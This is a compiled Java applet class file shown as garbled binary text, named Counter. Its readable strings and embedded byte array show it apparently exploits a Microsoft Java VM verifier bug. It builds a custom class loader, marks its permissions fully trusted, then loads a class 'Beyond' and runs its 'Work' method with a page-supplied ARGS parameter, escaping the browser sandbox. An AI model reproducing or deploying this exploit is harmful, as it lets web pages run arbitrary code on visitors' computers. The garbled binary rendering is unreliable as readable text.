����  - �  Counter  java/applet/Applet UCL_def [B 	Magic_def init ()V Code LineNumberTable  Gummy  	 <init>
    VerifierBug
     getClass ()Ljava/lang/Class;
    java/lang/Object   gummy_class Ljava/lang/Class;	    	   !  UCL_definition	    $ Magic  	  % ( ) myDefineClass )(Ljava/lang/String;[BII)Ljava/lang/Class;
  ' , - newInstance ()Ljava/lang/Object;
 / + 0 java/lang/Class 2 com.ms.security.PermissionSet 4 5 forName %(Ljava/lang/String;)Ljava/lang/Class;
 / 3 8 doit : ; 	getMethod @(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
 / 9 > !com/ms/security/PermissionDataSet
 =  A B setFullyTrusted (Z)V
 = @ E com/ms/security/PermissionSet  G &(Lcom/ms/security/PermissionDataSet;)V
 D F J K getClassLoader ()Ljava/lang/ClassLoader;
 / I N com/ms/vm/loader/URLClassLoader P Q value !Lcom/ms/vm/loader/URLClassLoader;	  O T U invoke 9(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
 W S X java/lang/reflect/Method Z Beyond \ 5 	loadClass
 M [ _ java/lang/String
 ^  b Work d java/lang/StringBuffer f    h (Ljava/lang/String;)V
 c g k ARGS m n getParameter &(Ljava/lang/String;)Ljava/lang/String;
  l q r append ,(Ljava/lang/String;)Ljava/lang/StringBuffer;
 c p u v toString ()Ljava/lang/String;
 c t
 ^ g z { out Ljava/io/PrintStream;	 } y ~ java/lang/System �   � h println
 � � � java/io/PrintStream � java/lang/Throwable stop this 	Synthetic
   � 	
  � 
SourceFile Counter.java !                     	  
  �    � Y� L� Y� M,+� � ,*� � ",#*� &*� &�� *N-� .:� /:+� S1� 6S-7� <:� =Y� ?:� C� DY� H:*� � L� M:	+	� R� :

+S
S
� VW	Y� ]N-� .W� /:� ^Y� `� S-a� <:� :� ^Y� cYe� i*j� o� s� w� xS6�-� VW� |� �� L�   
 �     � !  B  C D E F  H 1J 7L =M EN NP XR aS gT rU ~W �Y �Z �[ �] �_ �a �b �c �d �e �f �g �h �i �j �kr  � 	  
         �          t  � 	  �     
  E&    E
*/�Y�TY�TY�TY�TYTY-TY	YTY
TYTYTYTYcTYoTYmTY/TYmTYsTY/TYvTYmTY/TYlTYoTYaTYdTYeTYrTY /TY!UTY"RTY#LTY$CTY%lTY&aTY'sTY(sTY)LTY*oTY+aTY,dTY-eTY.rTY/TY1TY2TY4#TY5cTY6oTY7mTY8/TY9mTY:sTY;/TY<sTY=eTY>cTY?uTY@rTYAiTYBtTYCyTYD/TYESTYFeTYGcTYHuTYIrTYJiTYKtTYLyTYMCTYNlTYOaTYPsTYQsTYRLTYSoTYTaTYUdTYVeTYWrTYXTYZTY[cTY\oTY]nTY^tTY_rTY`oTYalTYbHTYcaTYdsTYehTYfTYhTYiLTYjjTYkaTYlvTYmaTYn/TYouTYptTYqiTYrlTYs/TYtHTYuaTYvsTYwhTYxtTYyaTYzbTY{lTY|eTY};TY~TY �TY �rTY �eTY �gTY �PTY �aTY �tTY �hTY �TY �TY �LTY �jTY �aTY �vTY �aTY �/TY �lTY �aTY �nTY �gTY �/TY �STY �tTY �rTY �iTY �nTY �gTY �;TY �TY �
TY �TY �TY �STY �oTY �fTY �tTY �wTY �aTY �rTY �eTY �\TY �MTY �iTY �cTY �rTY �oTY �sTY �oTY �fTY �tTY �\TY �JTY �aTY �vTY �aTY � TY �VTY �MTY �TY �TY �CTY �oTY �nTY �sTY �tTY �aTY �nTY �tTY �VTY �aTY �lTY �uTY �eTY �TY �TY �dTY �eTY �bTY �uTY �gTY �TY �TY �ZTY �TY �TY �	TY �dTY �eTY �bTY �uTY �gTY �lTY �oTY �aTY �dTY �TY �TY �pTY �rTY �oTY �gTY �rTY �eTY �sTY �sTY �LTY �iTY �sTY �tTY �eTY �nTY �eTY �rTY �sTY �TY TYLTYjTYaTYvTYaTY/TYuTYtTY	iTY
lTY/TYVTYeTYcTYtTYoTYrTY;TYTYTYdTYeTYfTYaTYuTYlTYtTYPTYeTYrTY mTY!iTY"sTY#sTY$iTY%oTY&nTY'sTY(TY*TY+LTY,cTY-oTY.mTY//TY0mTY1sTY2/TY3sTY4eTY5cTY6uTY7rTY8iTY9tTY:yTY;/TY<PTY=eTY>rTY?mTY@iTYAsTYBsTYCiTYDoTYEnTYFSTYGeTYHtTYI;TYJTYLTYMbTYNaTYOsTYPeTYQTYSTYTLTYUjTYVaTYWvTYXaTYY/TYZnTY[eTY\tTY]/TY^UTY_RTY`LTYa;TYbTYd	TYerTYfeTYgsTYhoTYiuTYjrTYkcTYleTYmsTYnTYpTYqLTYrjTYsaTYtvTYuaTYv/TYwlTYxaTYynTYzgTY{/TY|OTY}bTY~jTYeTY�cTY�tTY�;TY�TY�TY�PTY�MTY�nTY�aTY�mTY�eTY�sTY�pTY�aTY�cTY�eTY�TY�TY�sTY�pTY�oTY�lTY�iTY�cTY�yTY�TY�+TY�LTY�cTY�oTY�mTY�/TY�mTY�sTY�/TY�sTY�eTY�cTY�uTY�rTY�iTY�tTY�yTY�/TY�mTY�aTY�nTY�aTY�gTY�eTY�mTY�eTY�nTY�tTY�/TY�STY�eTY�cTY�uTY�rTY�iTY�tTY�yTY�PTY�oTY�lTY�iTY�cTY�yTY�;TY�TY�TY�eTY�xTY�tTY�rTY�aTY�CTY�oTY�dTY�eTY�bTY�aTY�sTY�eTY�sTY�TY�TY�[TY�LTY�jTY�aTY�vTY�aTY�/TY�nTY�eTY�tTY�/TY�UTY�RTY�LTY�;TY�TY�TY�oTY�fTY�fTY�lTY�iTY�nTY�eTY�cTY�oTY�nTY�tTY�eTY�xTY�tTY�TY�"TY LTYcTYoTYmTY/TYmTYsTY/TYaTY	pTY
pTYlTYeTYtTY/TYBTYrTYoTYwTYsTYeTYrTYATYpTYpTYlTYeTYtTYFTYrTYaTYmTY eTY!;TY"TY$	TY%fTY&LTY'oTY(gTY)LTY*oTY+aTY,dTY-sTY.TY0TY1fTY2PTY3rTY4oTY5hTY6iTY7bTY8iTY9tTY:RTY;eTY<dTY=iTY>rTY?eTY@cTYAtTYBsTYCTYETYFnTYGeTYHtTYIPTYJeTYKrTYLmTYMTYO-TYPLTYQcTYRoTYSmTYT/TYUmTYVsTYW/TYXsTYYeTYZcTY[uTY\rTY]iTY^tTY_yTY`/TYapTYbeTYcrTYdmTYeiTYfsTYgsTYhiTYioTYjnTYksTYl/TYmNTYneTYotTYpITYqOTYrPTYseTYtrTYumTYviTYwsTYxsTYyiTYzoTY{nTY|;TY}TY	TY�fTY�iTY�nTY�dTY�CTY�lTY�aTY�sTY�sTY�TY�%TY�(TY�LTY�jTY�aTY�vTY�aTY�/TY�lTY�aTY�nTY�gTY�/TY�STY�tTY�rTY�iTY�nTY�gTY�;TY�)TY�LTY�jTY�aTY�vTY�aTY�/TY�lTY�aTY�nTY�gTY�/TY�CTY�lTY�aTY�sTY�sTY�;TY�TY�TY�CTY�oTY�dTY�eTY�TY�TY�LTY�iTY�nTY�eTY�NTY�uTY�mTY�bTY�eTY�rTY�TTY�aTY�bTY�lTY�eTY�TY�TY�gTY�eTY�tTY�RTY�eTY�sTY�oTY�uTY�rTY�cTY�eTY�TY�"TY�(TY�LTY�jTY�aTY�vTY�aTY�/TY�lTY�aTY�nTY�gTY�/TY�STY�tTY�rTY�iTY�nTY�gTY�;TY�)TY�LTY�jTY�aTY�vTY�aTY�/TY�nTY�eTY�tTY�/TY�UTY�RTY�LTY�;TY�TY�TY sTYtTYaTYrTYtTYDTYoTYwTYnTY	lTY
oTYaTYdTYUTYITYTYTY(TYITYLTYjTYaTYvTYaTY/TYlTYaTYnTYgTY/TYSTY tTY!rTY"iTY#nTY$gTY%;TY&)TY'VTY(TY*TY+sTY,tTY-oTY.pTY/DTY0oTY1wTY2nTY3lTY4oTY5aTY6dTY7UTY8ITY9TY;TY<(TY=)TY>VTY?TYATYBsTYCeTYDtTYESTYFeTYGcTYHuTYIrTYJeTYKSTYLtTYMaTYNtTYOeTYPTYR'TYS(TYTLTYUjTYVaTYWvTYXaTYY/TYZlTY[aTY\nTY]gTY^/TY_STY`tTYarTYbiTYcnTYdgTYe;TYfLTYgjTYhaTYivTYjaTYk/TYllTYmaTYnnTYogTYp/TYqSTYrtTYsrTYtiTYunTYvgTYw;TYx)TYyVTYzTY|TY}gTY~eTYtTY�CTY�OTY�MTY�LTY�oTY�aTY�dTY�eTY�rTY�TY�GTY�(TY�LTY�jTY�aTY�vTY�aTY�/TY�lTY�aTY�nTY�gTY�/TY�STY�tTY�rTY�iTY�nTY�gTY�;TY�LTY�jTY�aTY�vTY�aTY�/TY�lTY�aTY�nTY�gTY�/TY�STY�tTY�rTY�iTY�nTY�gTY�;TY�)TY�LTY�cTY�oTY�mTY�/TY�mTY�sTY�/TY�vTY�mTY�/TY�lTY�oTY�aTY�dTY�eTY�rTY�/TY�UTY�RTY�LTY�CTY�lTY�aTY�sTY�sTY�LTY�oTY�aTY�dTY�eTY�rTY�;TY�TY�
TY�ETY�xTY�cTY�eTY�pTY�tTY�iTY�oTY�nTY�sTY�TY�3TY�TY�TY�jTY�aTY�vTY�aTY�/TY�lTY�aTY�nTY�gTY�/TY�ETY�xTY�cTY�eTY�pTY�tTY�iTY�oTY�nTY�TY�TY�aTY�dTY�jTY�uTY sTYtTYPTYeTYrTYmTYiTYsTYsTY	iTY
oTYnTYsTYTY&TY(TYLTYcTYoTYmTY/TYmTYsTY/TYsTYeTYcTYuTYrTYiTYtTY yTY!/TY"PTY#eTY$rTY%mTY&iTY'sTY(sTY)iTY*oTY+nTY,DTY-aTY.tTY/aTY0STY1eTY2tTY3;TY4)TY5VTY6TY8TY9gTY:eTY;tTY<CTY=oTY>dTY?eTY@BTYAaTYBsTYCeTYDTYFTYG(TYH)TYILTYJjTYKaTYLvTYMaTYN/TYOnTYPeTYQtTYR/TYSUTYTRTYULTYV;TYWTYYTYZcTY[hTY\eTY]cTY^kTY_CTY`oTYanTYbnTYceTYdcTYetTYfiTYgoTYhnTYiFTYjoTYkrTYlRTYmeTYndTYoiTYprTYqeTYrcTYstTYtiTYuoTYvnTYwTYyTYz(TY{LTY|jTY}aTY~vTYaTY�/TY�nTY�eTY�tTY�/TY�UTY�RTY�LTY�CTY�oTY�nTY�nTY�eTY�cTY�tTY�iTY�oTY�nTY�;TY�)TY�VTY�TY�!TY�cTY�rTY�eTY�aTY�tTY�eTY�DTY�eTY�fTY�aTY�uTY�lTY�tTY�ATY�pTY�pTY�lTY�eTY�tTY�PTY�eTY�rTY�mTY�iTY�sTY�sTY�iTY�oTY�nTY�DTY�aTY�tTY�aTY�TY�%TY�(TY�)TY�LTY�cTY�oTY�mTY�/TY�mTY�sTY�/TY�sTY�eTY�cTY�uTY�rTY�iTY�tTY�yTY�/TY�PTY�eTY�rTY�mTY�iTY�sTY�sTY�iTY�oTY�nTY�DTY�aTY�tTY�aTY�STY�eTY�tTY�;TY�TY�TY�gTY�eTY�tTY�ATY�uTY�dTY�iTY�oTY�CTY�lTY�iTY�pTY�TY�'TY�(TY�LTY�jTY�aTY�vTY�aTY�/TY�nTY�eTY�tTY�/TY�UTY�RTY LTY;TY)TYLTYjTYaTYvTYaTY/TY	aTY
pTYpTYlTYeTYtTY/TYATYuTYdTYiTYoTYCTYlTYiTYpTY;TYTYTYgTYeTYtTY RTY!eTY"sTY#oTY$uTY%rTY&cTY'eTY(ATY)sTY*STY+tTY,rTY-eTY.aTY/mTY0TY2)TY3(TY4LTY5jTY6aTY7vTY8aTY9/TY:lTY;aTY<nTY=gTY>/TY?STY@tTYArTYBiTYCnTYDgTYE;TYF)TYGLTYHjTYIaTYJvTYKaTYL/TYMiTYNoTYO/TYPITYQnTYRpTYSuTYTtTYUSTYVtTYWrTYXeTYYaTYZmTY[;TY\TY^TY_sTY`eTYatTYbOTYcfTYdfTYelTYfiTYgnTYheTYiCTYjoTYknTYltTYmeTYnxTYotTYpTYr%TYs(TYtLTYucTYvoTYwmTYx/TYymTYzsTY{/TY|aTY}pTY~pTYlTY�eTY�tTY�/TY�BTY�rTY�oTY�wTY�sTY�eTY�rTY�ATY�pTY�pTY�lTY�eTY�tTY�FTY�rTY�aTY�mTY�eTY�;TY�)TY�VTY�TY�TY�rTY�eTY�mTY�oTY�vTY�eTY�PTY�rTY�oTY�gTY�rTY�eTY�sTY�sTY�LTY�iTY�sTY�tTY�eTY�nTY�eTY�rTY�TY�-TY�(TY�LTY�cTY�oTY�mTY�/TY�mTY�sTY�/TY�vTY�mTY�/TY�lTY�oTY�aTY�dTY�eTY�rTY�/TY�ITY�LTY�oTY�aTY�dTY�eTY�rTY�PTY�rTY�oTY�gTY�rTY�eTY�sTY�sTY�LTY�iTY�sTY�tTY�eTY�nTY�eTY�rTY�;TY�)TY�VTY�TY�
TY�iTY�nTY�iTY�tTY�LTY�oTY�aTY�dTY�eTY�rTY�TY�TY�gTY�eTY�tTY�ITY�mTY�aTY�gTY�eTY�TY� TY�(TY�LTY�jTY�aTY vTYaTY/TYnTYeTYtTY/TYUTYRTY	LTY
;TY)TYLTYjTYaTYvTYaTY/TYaTYwTYtTY/TYITYmTYaTYgTYeTY;TYTYTYaTY dTY!dTY"PTY#rTY$oTY%gTY&rTY'eTY(sTY)sTY*LTY+iTY,sTY-tTY.eTY/nTY0eTY1rTY2TY4TY5gTY6eTY7tTY8DTY9eTY:fTY;aTY<uTY=lTY>tTY?PTY@eTYArTYBmTYCiTYDsTYEsTYFiTYGoTYHnTYIsTYJTYL!TYM(TYN)TYOLTYPcTYQoTYRmTYS/TYTmTYUsTYV/TYWsTYXeTYYcTYZuTY[rTY\iTY]tTY^yTY_/TY`PTYaeTYbrTYcmTYdiTYesTYfsTYgiTYhoTYinTYjSTYkeTYltTYm;TYnTYpTYqcTYrrTYseTYtaTYutTYveTYwDTYxeTYyfTYzaTY{uTY|lTY}tTY~LTYoTY�aTY�dTY�eTY�rTY�PTY�eTY�rTY�mTY�iTY�sTY�sTY�iTY�oTY�nTY�sTY�TY�TY�sTY�eTY�tTY�UTY�RTY�LTY�RTY�eTY�dTY�iTY�rTY�eTY�cTY�tTY�iTY�oTY�nTY�ATY�lTY�lTY�oTY�wTY�eTY�dTY�TY�TY�(TY�ZTY�)TY�VTY�TY�	TY�lTY�oTY�aTY�dTY�CTY�lTY�aTY�sTY�sTY�TY�OTY�TY� TY�jTY�aTY�vTY�aTY�/TY�lTY�aTY�nTY�gTY�/TY�CTY�lTY�aTY�sTY�sTY�NTY�oTY�tTY�FTY�oTY�uTY�nTY�dTY�ETY�xTY�cTY�eTY�pTY�tTY�iTY�oTY�nTY�TY�&TY�(TY�LTY�jTY�aTY�vTY�aTY�/TY�lTY�aTY�nTY�gTY�/TY�STY�tTY�rTY�iTY�nTY�gTY�;TY�ZTY�)TY�LTY�jTY�aTY�vTY�aTY /TYlTYaTYnTYgTY/TYCTYlTYaTY	sTY
sTY;TYTYTYgTYeTYtTYSTYeTYcTYuTYrTYiTYtTYyTYPTYoTYlTYiTYcTYyTY TY"-TY#(TY$)TY%LTY&cTY'oTY(mTY)/TY*mTY+sTY,/TY-sTY.eTY/cTY0uTY1rTY2iTY3tTY4yTY5/TY6mTY7aTY8nTY9aTY:gTY;eTY<mTY=eTY>nTY?tTY@/TYASTYBeTYCcTYDuTYErTYFiTYGtTYHyTYIPTYJoTYKlTYLiTYMcTYNyTYO;TYPTYRTYS<TYTiTYUnTYViTYWtTYX>TYYTY["TY\(TY]LTY^cTY_oTY`mTYa/TYbmTYcsTYd/TYevTYfmTYg/TYhlTYioTYjaTYkdTYleTYmrTYn/TYoLTYpoTYqaTYrdTYseTYtrTYuPTYvaTYwrTYxaTYymTYzsTY{;TY|)TY}VTY~TY�STY�,TY�
TY�TY�UTY�TY�TY�UTY�RTY�LTY�CTY�lTY�aTY�sTY�sTY�LTY�oTY�aTY�dTY�eTY�rTY�.TY�jTY�aTY�vTY�aTY�TY�
TY�STY�oTY�uTY�rTY�cTY�eTY�FTY�iTY�lTY�eTY�!TY�TY�TY�TY�	TY�TY�TY�TY�TY�TY�TY�TY�TY�	TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY�TY TYTYTYTY
TYTYTYTYTYTYTYTY TY"TY&TY(TY*TY.TY0TY2TY6TY8 TY:TY>TY@!TYB"TYFTYH"TYJ#TYL$TYNTYP%TYTTYVTYXTY\TY]TY^�TYbTYd&TYhTYjTYn(TYpTYr'TYt(TYvTYx%TY|TY~TY�TY�TY�TY��TY�TY�&TY�TY�TY�,TY�)TY�*TY�TY�%TY�TY�TY�TY��TY�TY�&TY�TY�TY�0TY�+TY�,TY�TY�%TY�TY�TY�TY��TY�TY�&TY�TY�TY�3TY�TY�-TY�.TY�TY�%TY�TY�TY�TY��TY�TY	&TY	TY	TY	6TY	TY	/TY	0TY	TY	1TY	TY	TY	2TY	%TY	#TY	%TY	'TY	+TY	,TY	-�TY	1TY	3&TY	7
TY	9TY	==TY	A>TY	C!TY	E4TY	G5TY	ITY	K%TY	OTY	STY	WTY	X�TY	\TY	^&TY	bTY	dTY	hBTY	jTY	l6TY	n7TY	pTY	r%TY	vTY	xTY	zTY	~TY	TY	��TY	�TY	�&TY	�TY	�TY	�ETY	� TY	�8TY	�9TY	�TY	�%TY	�TY	�TY	�TY	��TY	�TY	�&TY	�TY	�TY	�ITY	�	TY	�:TY	�;TY	�TY	�%TY	�TY	�TY	�TY	�TY	��TY	�TY	�&TY	�TY	�TY	�LTY	�!TY	�<TY	�=TY	�TY	�%TY	�TY	�TY	�TY	�TY	�TY	��TY	�TY	�&TY
TY
TY
PTY
	TY
>TY
?TY
TY
%TY
TY
TY
TY
TY
TY
�TY
#TY
%&TY
)TY
+TY
/TTY
1TY
3@TY
5ATY
7TY
9%TY
=TY
ATY
ETY
F�TY
JTY
L&TY
PTY
RTY
VYTY
XTY
ZBTY
\CTY
^TY
`%TY
dTY
hTY
lTY
m�TY
qTY
s&TY
wTY
yTY
}\TY
�DTY
�,TY
�TY
�%TY
�TY
�TY
�TY
��TY
�TY
�&TY
�TY
�TY
�_TY
�!TY
�ETY
�FTY
�TY
�%TY
�TY
�TY
�TY
�TY
�TY
��TY
�TY
�&TY
�TY
�TY
�bTY
�TY
�GTY
�CTY
�TY
�%TY
�TY
�TY
�TY
��TY
�TY
�&TY
�TY
�TY
�fTY
�HTY
�ITY
�TY
�%TYTYTYTY	TY
TY�TYTY&TYTYTYiTYJTY!,TY#TY%%TY)TY-TY1TY2�TY6TY8&TY<TY>TYBmTYDTYFKTYHLTYJTYL%TYPTYTTYXTYY�TY]TY_&TYcTYeTYipTYkTYmMTYo$TYqTYs1TYwTYyTY{NTY}%TY�TY�TY�TY�TY�TY��TY�TY�&TY�TY�TY�tTY�TY�MTY�PTY�TY�%TY�TY�TY�TY�TY�TY��TY�TY�&TY�TY�TY�xTY�TY�QTY�RTY�TY�1TY�TY�TY�NTY�%TY�TY�TY�TY�TY�TY��TY�TY�&TY�TY�TY�|TY�TY�STY�TTY�TY�%TY!TYTYTYTY*TY�TYVTY�TYTY&TY
TYTY 8TY"TY$9TY&TY(XTY,TY.WT� *u�Y�TY�TY�TY�TYTY-TY	TY
TYTYTYTYTYTYTYMTYaTYgTYiTYcTYTYTYvTYaTYlTY uTY!eTY"TY$TY%
TY'TY)TY*	TY,TY.TY/TY1TY2GTY3uTY4mTY5mTY6yTY7TY9TY:jTY;aTY<vTY=aTY>/TY?lTY@aTYAnTYBgTYC/TYDOTYEbTYFjTYGeTYHcTYItTYJTYLTYMdTYNoTYOiTYPtTYQTYSTYTdTYUeTYV